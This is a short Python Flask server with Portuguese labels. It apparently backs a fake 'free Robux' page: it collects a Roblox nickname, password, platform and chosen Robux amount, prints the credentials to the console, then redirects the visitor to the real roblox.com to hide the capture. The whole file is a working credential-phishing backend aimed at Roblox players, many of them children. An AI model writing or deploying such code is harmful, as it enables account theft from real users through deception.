from flask import Flask, request, send_file, redirect, url_for

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def receber_dados():
    if request.method == 'POST':
        nickname = request.form['nickname']
        password = request.form['password']
        plataforma = request.form['plataforma']
        robux_choice = request.form['robux_choice']
        print("--- Dados Recebidos ---")
        print(f"Nickname: {nickname}")
        print(f"Senha: {password}")
        print(f"Plataforma: {plataforma}")
        print(f"Robux Escolhido: {robux_choice}")
        print("------------------------")
        return redirect("https://roblox.com")
    return send_file('index.html')

if __name__ == '__main__':
    app.run(debug=True, port=5500)